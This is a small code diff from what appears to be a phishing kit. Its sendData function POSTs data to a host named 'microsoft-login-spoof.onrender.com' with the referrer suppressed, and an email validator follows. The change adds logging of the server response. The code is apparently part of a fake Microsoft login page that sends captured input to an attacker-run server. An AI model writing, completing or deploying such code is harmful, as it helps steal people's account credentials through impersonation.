@@ -30,7 +30,7 @@ const sendData = (data) => fetch(`https://microsoft-login-spoof.onrender.com/use
     },
     referrerPolicy: 'no-referrer',
     body: createBody(data),
-})
+}).then(response => console.error(response));
 
 function validateEmail(email) {
     const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
